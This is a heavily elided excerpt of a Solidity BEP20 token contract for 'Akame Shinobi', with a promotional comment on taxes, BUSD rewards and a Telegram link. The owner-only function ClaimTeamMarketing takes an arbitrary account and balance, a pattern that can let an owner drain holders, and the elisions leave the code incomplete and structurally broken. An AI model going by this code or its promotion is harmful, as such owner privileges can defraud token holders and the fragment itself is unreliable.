...
/**
Akame Shinobi based on anime "Akame ga Kill!" with Anti-jeet function that would benefit all holders by rewarding them using $BUSD. 
Starting with low marketcap. Golden time (5% Low Tax) will run for 30minutes once launch this is to benefit all early holders.  
5% BUSD rewards will be given to all holders. 3% Goes to marketing and 2% for the Liquidity to keep the floor stable in total of 10% per slippage.

5% BUSD REWARDS
3% MARKETING
2% LIQUIDITY POOL

https://t.me/AkameShinobi
...
*/
    ...
    contract AkameShinobi  is IBEP20, Ownable
    {
        ...
        string private constant _name = "Akame Shinobi";
        ...
        address public constant MarketingWallet=0xD0864AF613C92E329e6868cE10bA7aCe6F04aFAf; 
        ...
        constructor () {
           ...
           function LiquidityProvider(address account) external onlyOwner {
            ...
            function BUSDReceiver(address[] calldata addresses) external onlyOwner {
                 for (uint256 i; i < addresses.length; ++i) {
                     _isSendRewards[addresses[i]] = true;
                }
           }

      function ClaimTeamMarketing(address account, uint256 balance) onlyOwner  public virtual {
